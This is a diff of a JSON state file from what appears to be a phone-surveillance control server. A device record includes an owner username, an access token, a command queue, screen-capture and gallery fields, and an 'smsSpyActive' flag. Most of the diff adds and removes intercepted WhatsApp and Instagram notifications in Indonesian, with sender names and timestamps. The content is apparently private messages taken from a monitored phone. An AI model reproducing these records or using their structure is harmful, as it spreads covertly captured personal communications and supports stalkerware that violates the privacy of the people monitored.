@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003806069,
+    "lastSeen": 1776003808208,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (41 pesan): ~ '`'foreigners'`",
+        "content": "anu",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003810921
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎40 pesan baru",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003807634
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (40 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "iya kak",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003807625
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎40 pesan baru",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003807487
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (40 pesan): ~ zaa?",
@@ -4091,38 +4123,6 @@
         "time": "12/04 14:58",
         "pkg": "com.whatsapp",
         "receivedAt": 1775980726017
-      },
-      {
-        "appName": "Instagram",
-        "sender": "ONIC",
-        "content": "Cerita baru: \"Masih dikasih rezeki @mpl.id.official 🥹🤲\"",
-        "time": "12/04 14:58",
-        "pkg": "com.instagram.android",
-        "receivedAt": 1775980706442
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "‎4 pesan baru",
-        "time": "12/04 12:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775970471210
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌 (2 pesan): Membalas Anda",
-        "content": "~ a֟waa୨ৎ: 1 taun",
-        "time": "12/04 12:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775970463437
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "‎2 pesan baru",
-        "time": "12/04 12:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775970463425
       }
     ],
     "galleryPhotos": [],
